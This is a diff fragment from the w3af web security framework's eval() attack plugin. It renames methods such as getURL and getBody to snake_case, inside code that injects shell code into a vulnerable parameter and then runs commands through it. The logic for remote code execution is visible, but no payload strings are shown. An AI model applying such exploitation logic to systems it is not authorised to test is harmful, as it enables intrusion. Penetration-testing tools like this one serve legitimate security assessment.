@@ -84,7 +84,7 @@ class eval(AttackPlugin):
         @return : True if vuln can be exploited.
         '''
         # Get the shells
-        extension = vuln_obj.getURL().getExtension()
+        extension = vuln_obj.get_url().get_extension()
         # I get a list of tuples with code and extension to use
         shell_code_list = shell_handler.get_shell_code(extension)
 
@@ -96,14 +96,14 @@ class eval(AttackPlugin):
             data_container[vuln_obj.get_var()] = code
 
             try:
-                http_res = function_reference(vuln_obj.getURL(),
+                http_res = function_reference(vuln_obj.get_url(),
                                               str(data_container))
             except w3afException, w3:
                 msg = 'An error ocurred while trying to exploit the eval()'\
                       ' vulnerability. Original exception: "%s".'
                 om.out.debug(msg % w3)
             else:
-                cut_result = self._define_exact_cut(http_res.getBody(),
+                cut_result = self._define_exact_cut(http_res.get_body(),
                                                     shell_handler.SHELL_IDENTIFIER)
                 if cut_result:
                     msg = 'Sucessfully exploited eval() vulnerability using'\
@@ -154,14 +154,14 @@ class eval_shell(exec_shell):
         exploit_dc['cmd'] = command
         exploit_dc[self.get_var()] = self._shell_code
         try:
-            response = function_reference(self.getURL(), str(exploit_dc))
+            response = function_reference(self.get_url(), str(exploit_dc))
         except w3afException, w3:
             msg = 'An error occurred while trying to exploit the eval()'\
                   ' vulnerability (sending command %s). Original exception: "%s".'
             om.out.debug(msg % (command, w3))
             return 'Unexpected error, please try again.'
         else:
-            return shell_handler.extract_result(response.getBody())
+            return shell_handler.extract_result(response.get_body())
 
     def end(self):
         '''
